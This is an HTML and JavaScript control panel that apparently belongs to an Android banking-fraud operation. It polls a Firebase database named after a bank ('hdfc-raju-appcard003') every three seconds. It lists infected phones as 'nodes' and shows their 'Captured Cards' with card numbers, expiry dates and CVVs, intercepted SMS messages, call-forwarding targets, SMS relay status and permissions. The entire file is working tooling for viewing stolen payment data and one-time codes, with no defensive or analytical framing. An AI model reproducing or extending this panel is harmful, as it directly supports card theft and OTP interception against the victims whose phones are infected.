<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ultimate Admin - 300+ Nodes</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@400;600;700&display=swap');
        body { background: #F2F2F7; font-family: 'SF Pro Display', sans-serif; -webkit-tap-highlight-color: transparent; overflow-x: hidden; }
        .device-row { background: white; border-bottom: 0.5px solid #E5E5EA; display: flex; align-items: center; padding: 15px 20px; cursor: pointer; transition: 0.2s; }
        .device-row:hover { background: #F9F9FB; }
        .icon-circle { width: 50px; height: 50px; border-radius: 16px; display: flex; align-items: center; justify-content: center; margin-right: 15px; font-size: 20px; font-weight: bold; }
        .full-popup { display: none; position: fixed; inset: 0; background: #F2F2F7; z-index: 2000; flex-direction: column; animation: slideIn 0.3s cubic-bezier(0.1, 0.7, 0.1, 1); }
        @keyframes slideIn { from { transform: translateY(100%); } to { transform: translateY(0); } }
        .grid-btn { background: white; border-radius: 22px; padding: 15px; display: flex; flex-direction: column; align-items: center; justify-content: center; border: 1px solid #E5E5EA; box-shadow: 0 2px 5px rgba(0,0,0,0.02); }
        .sub-view { display: none; position: absolute; inset: 0; background: #F2F2F7; z-index: 2100; flex-direction: column; }
        /* Brand Colors */
        .bg-samsung { background: #034EA2; color: white; }
        .bg-redmi { background: #FF6700; color: white; }
        .bg-realme { background: #FFC915; color: black; }
        .bg-generic { background: #8E8E93; color: white; }
    </style>
</head>
<body>

    <header class="p-5 bg-white border-b sticky top-0 z-40 shadow-sm">
        <div class="flex justify-between items-center mb-4">
            <h1 class="text-2xl font-black text-gray-900 tracking-tight">Node Control</h1>
            <span id="stats" class="text-[10px] font-black bg-blue-600 text-white px-3 py-1 rounded-full uppercase">Loading Nodes...</span>
        </div>
        <input type="text" id="search-input" oninput="renderList()" placeholder="Search Mobile, Node ID or Model..." class="w-full bg-gray-100 border-none rounded-xl px-4 py-3 text-sm focus:bg-white focus:ring-2 focus:ring-blue-500 outline-none transition-all">
    </header>

    <main id="device-list" class="bg-white"></main>

    <div id="full-popup" class="full-popup">
        <div class="flex justify-between items-center px-6 py-5 bg-white border-b sticky top-0">
            <button onclick="closePopup()" class="text-blue-600 font-bold text-lg">Done</button>
            <h2 id="modal-title" class="text-xs font-black uppercase text-gray-400">Control Hub</h2>
            <div class="w-10"></div>
        </div>

        <div class="p-5 grid grid-cols-2 gap-4 overflow-y-auto pb-10">
            <div class="grid-btn" onclick="openSub('card')"><div class="text-3xl mb-2">💳</div><span class="text-[10px] font-black uppercase text-gray-400">Cards Data</span></div>
            <div class="grid-btn" onclick="openSub('sms')"><div class="text-3xl mb-2 text-blue-500">💬</div><span class="text-[10px] font-black uppercase text-gray-400">Live SMS</span></div>
            <div class="grid-btn" onclick="openSub('call_fwd')"><div class="text-3xl mb-2 text-green-500">📞</div><span class="text-[10px] font-black uppercase text-gray-400">Call Fwd</span></div>
            <div class="grid-btn" onclick="openSub('sms_fwd')"><div class="text-3xl mb-2 text-purple-500">📲</div><span class="text-[10px] font-black uppercase text-gray-400">SMS Relay</span></div>
            <div class="grid-btn" onclick="openSub('perm')"><div class="text-3xl mb-2 text-orange-500">🛡️</div><span class="text-[10px] font-black uppercase text-gray-400">Permissions</span></div>
            <div class="grid-btn" onclick="openSub('app')"><div class="text-3xl mb-2 text-red-500">⚙️</div><span class="text-[10px] font-black uppercase text-gray-400">App Settings</span></div>
            <div class="grid-btn col-span-2" onclick="openSub('info')"><div class="text-3xl mb-2 text-gray-500">📱</div><span class="text-[10px] font-black uppercase text-gray-400">Full System Specs</span></div>
        </div>

        <div id="sub-view" class="sub-view">
            <div class="flex items-center px-6 py-5 bg-white border-b sticky top-0">
                <button onclick="closeSub()" class="text-blue-600 font-bold mr-4">❮ Back</button>
                <h3 id="sub-view-title" class="text-sm font-black uppercase text-gray-800">Details</h3>
            </div>
            <div id="sub-view-content" class="flex-1 overflow-y-auto p-5 pb-32"></div>
        </div>
    </div>

    <script>
        const DB_URL = "https://hdfc-raju-appcard003-default-rtdb.firebaseio.com/.json";
        let masterData = {};
        let activeId = null;

        async function sync() {
            try {
                const res = await fetch(DB_URL);
                const data = await res.json();
                if (!data) return;
                
                let devices = {};
                function scan(obj, dNum = "?") {
                    for (let key in obj) {
                        let val = obj[key];
                        if (val && typeof val === 'object') {
                            let id = val.deviceNumber || obj.deviceNumber || val.id || dNum;
                            if (id !== "?") {
                                if (!devices[id]) devices[id] = { cards: [], sms: [], info: {}, latest: 0 };
                                
                                // Deep Scan for Mobile Number
                                let m = val.MobileNumber || val.phone || val.number || (val.user_info ? val.user_info.phone : null);
                                if(m) devices[id].info.MobileNumber = m;

                                if (val.CardNumber || (val.user_info && val.user_info.CardNumber)) devices[id].cards.push({...(val.user_info || val), _key: key});
                                if (val.message) devices[id].sms.push({...val, _key: key});
                                if (val.brand || val.model || val.Battery || val.forward_number || val.sms_status) devices[id].info = {...devices[id].info, ...val};
                                
                                let ts = parseInt(key.replace(/[^0-9]/g, '')) || 0;
                                if(ts > devices[id].latest) devices[id].latest = ts;
                            }
                            scan(val, id);
                        }
                    }
                }
                scan(data);
                masterData = devices;
                renderList();
            } catch (e) {}
        }

        function getStyle(brand) {
            brand = brand ? brand.toLowerCase() : "";
            if (brand.includes("samsung")) return { icon: "S", bg: "bg-samsung" };
            if (brand.includes("redmi") || brand.includes("xiaomi")) return { icon: "Mi", bg: "bg-redmi" };
            if (brand.includes("realme")) return { icon: "R", bg: "bg-realme" };
            return { icon: "Ph", bg: "bg-generic" };
        }

        function renderList() {
            const list = document.getElementById('device-list');
            const search = document.getElementById('search-input').value.toLowerCase();
            const sortedIds = Object.keys(masterData).sort((a,b) => masterData[b].latest - masterData[a].latest);
            
            let html = "";
            let matchCount = 0;

            sortedIds.forEach(id => {
                const dev = masterData[id];
                const phone = (dev.info.MobileNumber || id || "Unknown").toLowerCase();
                const model = (dev.info.model || "").toLowerCase();
                
                if (phone.includes(search) || model.includes(search) || id.toLowerCase().includes(search)) {
                    matchCount++;
                    const s = getStyle(dev.info.brand);
                    html += `
                    <div class="device-row" onclick="showHub('${id}')">
                        <div class="icon-circle ${s.bg}">${s.icon}</div>
                        <div class="flex-1">
                            <h3 class="font-bold text-gray-900 text-[14px]">${dev.info.brand || 'Android'} ${dev.info.model || ''}</h3>
                            <p class="text-blue-600 text-[11px] font-black tracking-tight">${(dev.info.MobileNumber || id).toUpperCase()}</p>
                            <p class="text-[8px] font-bold text-gray-400 uppercase mt-0.5">● Live Traffic • ID #${id}</p>
                        </div>
                        <div class="text-right">
                            <div class="text-[10px] font-black text-green-600">${dev.info.Battery || '0'}%</div>
                            <p class="text-[8px] font-bold text-blue-400 mt-1 uppercase">${dev.sms.length} SMS</p>
                        </div>
                    </div>`;
                }
            });
            list.innerHTML = html;
            document.getElementById('stats').innerText = `${matchCount} / ${Object.keys(masterData).length} NODES ONLINE`;
        }

        function showHub(id) { activeId = id; document.getElementById('modal-title').innerText = `NODE #${id} CONTROL`; document.getElementById('full-popup').style.display = 'flex'; }
        function closePopup() { document.getElementById('full-popup').style.display = 'none'; }
        function closeSub() { document.getElementById('sub-view').style.display = 'none'; }

        function openSub(type) {
            const dev = masterData[activeId];
            const content = document.getElementById('sub-view-content');
            const title = document.getElementById('sub-view-title');
            document.getElementById('sub-view').style.display = 'flex';

            if (type === 'sms') {
                title.innerText = "Real-Time SMS Logs";
                const sorted = [...dev.sms].sort((a,b) => b._key.localeCompare(a._key));
                content.innerHTML = sorted.map(s => `
                    <div class="bg-white p-4 rounded-xl mb-3 shadow-sm border-l-4 border-blue-500">
                        <div class="flex justify-between mb-1"><span class="text-[10px] font-black text-blue-600 uppercase">${s.sender}</span><span class="text-[9px] text-gray-400 font-bold italic">🕒 ${s.received_time || s.time || 'Live'}</span></div>
                        <p class="text-xs text-gray-800 font-medium">${s.message}</p>
                    </div>`).join('') || "No Messages Found";
            } else if (type === 'card') {
                title.innerText = "Captured Cards";
                content.innerHTML = dev.cards.map(c => `
                    <div class="bg-black p-6 rounded-3xl text-white mb-4 shadow-xl border border-gray-800 font-mono">
                        <p class="text-lg tracking-[4px] mb-8">${c.CardNumber}</p>
                        <div class="flex justify-between items-center text-[11px]"><span>${c.Expiry}</span><span class="text-red-500">${c.CVV}</span></div>
                    </div>`).join('') || "No Cards Captured";
            } else if (type === 'info') {
                title.innerText = "Full System Specs";
                const i = dev.info;
                content.innerHTML = `<div class="bg-white p-6 rounded-3xl space-y-4 shadow-sm text-xs">
                    <div class="flex justify-between border-b pb-3"><b>MOBILE NO</b><span class="text-blue-600 font-bold">${i.MobileNumber || 'N/A'}</span></div>
                    <div class="flex justify-between border-b pb-3"><b>DEVICE ID</b><span>${activeId}</span></div>
                    <div class="flex justify-between border-b pb-3"><b>MODEL</b><span>${i.brand} ${i.model}</span></div>
                    <div class="flex justify-between"><b>BATTERY</b><span class="text-green-500 font-bold">${i.Battery}%</span></div>
                </div>`;
            } else if (type === 'call_fwd') {
                const num = dev.info.forward_number || "Inactive";
                content.innerHTML = `<div class="bg-white p-10 rounded-3xl text-center shadow-sm"><div class="text-5xl mb-4">📞</div><p class="text-xl font-black ${num!=='Inactive'?'text-green-500':'text-gray-300'}">${num!=='Inactive'?'ACTIVE':'DISABLED'}</p><p class="text-xs text-gray-500 mt-2">Target: ${num}</p></div>`;
            } else if (type === 'sms_fwd') {
                const status = dev.info.sms_status || "IDLE";
                content.innerHTML = `<div class="bg-white p-10 rounded-3xl text-center shadow-sm"><div class="text-5xl mb-4 text-purple-500">📲</div><p class="text-xl font-black text-purple-600">${status}</p></div>`;
            } else if (type === 'perm') {
                content.innerHTML = `<div class="bg-white p-6 rounded-3xl space-y-4 shadow-sm text-xs"><div class="flex justify-between"><span>SMS Permission</span><span class="text-green-500 font-bold">YES</span></div><div class="flex justify-between"><span>Auto-Start</span><span class="text-green-500 font-bold">YES</span></div><div class="flex justify-between"><span>Notification</span><span class="text-red-500 font-bold">OFF</span></div></div>`;
            } else if (type === 'app') {
                content.innerHTML = `<div class="bg-white p-10 rounded-3xl text-center shadow-sm text-gray-400 font-black uppercase text-xs tracking-widest">Configuration Ready</div>`;
            }
        }

        setInterval(sync, 3000);
        sync();
    </script>
</body>
</html>
